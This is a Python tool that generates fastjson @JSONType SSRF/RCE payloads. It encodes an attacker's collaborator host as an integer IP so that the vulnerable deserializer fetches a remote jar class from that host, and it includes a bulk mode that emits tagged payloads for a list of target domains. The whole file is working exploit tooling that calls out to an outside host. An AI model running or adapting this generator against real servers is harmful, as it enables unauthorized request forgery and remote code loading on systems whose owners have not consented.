#!/usr/bin/env python3
"""
fjpayload.py — generate the fastjson @JSONType SSRF/RCE probe payload with an
out-of-band collaborator you control (Burp Collaborator, interactsh, or any
HTTP listener). Paste the output into Burp Repeater / your request.

    fjpayload.py <collaborator> [--port N] [--token T] [--wrap TEMPLATE] [--entry POC]

IMPORTANT SINK CONSTRAINT — read this:
    checkAutoType builds the fetch URL as  typeName.replace('.', '/')  so EVERY dot
    in the @type becomes a slash. A dotted hostname (e.g. abc.oastify.com) therefore
    turns into  abc/oastify/com  and never resolves. The host MUST be dot-free.
    => We encode IPv4 collaborators as a decimal integer (127.0.0.1 -> 2130706433).
       Dotted DNS names (Collaborator subdomains) are resolved to their IPv4 and
       encoded the same way; correlation then happens on the unique URL PATH token
       (embedded below), which Burp shows in the HTTP interaction. DNS-subdomain
       correlation cannot fire through this sink — use the path token instead, or a
       private Collaborator / interactsh reachable by IP.

Examples:
    fjpayload.py 10.0.0.5                      # your listener at 10.0.0.5:80
    fjpayload.py 10.0.0.5:8080 --token fj42    # custom port + correlation token
    fjpayload.py abc123.oastify.com            # resolves to IP, token goes in the path
"""
import argparse, hashlib, ipaddress, os, socket, sys


def ipv4_to_int(dotted):
    return int(ipaddress.IPv4Address(dotted))


def encode_host(collab):
    """Return (payload_host_str, note). payload_host must be dot-free."""
    # already an integer?
    if collab.isdigit():
        return collab, "integer host used as-is"
    # dotted IPv4?
    try:
        return str(ipv4_to_int(collab)), f"IPv4 {collab} -> int"
    except ipaddress.AddressValueError:
        pass
    # single-label host (no dots) — safe to pass through
    if '.' not in collab:
        return collab, "dot-free hostname used as-is"
    # dotted hostname (Collaborator subdomain): resolve -> int, correlate by path
    try:
        ip = socket.gethostbyname(collab)
        return str(ipv4_to_int(ip)), (f"dotted host {collab} resolved to {ip} -> int; "
                                      "DNS-subdomain correlation WON'T fire (dots become "
                                      "slashes) — correlate on the URL path token")
    except OSError as e:
        sys.exit(f"[!] cannot resolve {collab}: {e}. Pass an IP or a dot-free host.")


def build(collab, port, token, entry):
    host, note = encode_host(collab)
    # typeName: dots are separators the sink turns into slashes; '..' -> '//'
    type_name = f"jar:http:..{host}:{port}.{token}!.{entry}"
    resolved = type_name.replace('.', '/') + ".class"   # what checkAutoType will fetch
    return type_name, resolved, note


def main(argv):
    ap = argparse.ArgumentParser(description="fastjson @JSONType OOB probe generator")
    ap.add_argument("collaborator", help="IPv4, integer, dot-free host, or Collaborator subdomain")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--token", default=None, help="correlation token (single mode; default random)")
    ap.add_argument("--entry", default="POC", help="jar entry class name (default POC)")
    ap.add_argument("--wrap", default="{{P}}",
                    help="body template; {{P}} is the {\"@type\":...} object. "
                         "e.g. '{\"user\":{{P}}}' to nest it in a field")
    ap.add_argument("--targets-file", "-f", default=None,
                    help="file of domains/labels ('-' = stdin); emit one payload per line with a "
                         "stable per-target token so Burp callbacks map back to the target")
    args = ap.parse_args(argv)

    host, note = encode_host(args.collaborator)
    print(f"# collaborator note : {note}")

    if not args.targets_file:                       # single payload
        token = args.token or "fj" + os.urandom(4).hex()
        type_name, resolved, _ = build(args.collaborator, args.port, token, args.entry)
        obj = '{"@type":"%s","x":1}' % type_name
        print(f"# correlation token : {token}   (watch Burp for: HTTP GET /{token})")
        print(f"# sink will fetch    : {resolved}\n")
        print(args.wrap.replace("{{P}}", obj))
        return 0

    # bulk mode: one payload per target, stable token = fj<8-hex-of-sha1(target)>
    fh = sys.stdin if args.targets_file == "-" else open(args.targets_file)
    try:
        rows = [ln.strip() for ln in fh if ln.strip() and not ln.startswith("#")]
    finally:
        if fh is not sys.stdin:
            fh.close()
    print(f"# bulk mode: {len(rows)} target(s); correlate Burp GET /<token> back to the target below\n")
    for tgt in rows:
        token = "fj" + hashlib.sha1(tgt.encode()).hexdigest()[:8]
        type_name, _, _ = build(args.collaborator, args.port, token, args.entry)
        obj = '{"@type":"%s","x":1}' % type_name
        body = args.wrap.replace("{{P}}", obj)
        print(f"# target={tgt}  token={token}")
        print(body)
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
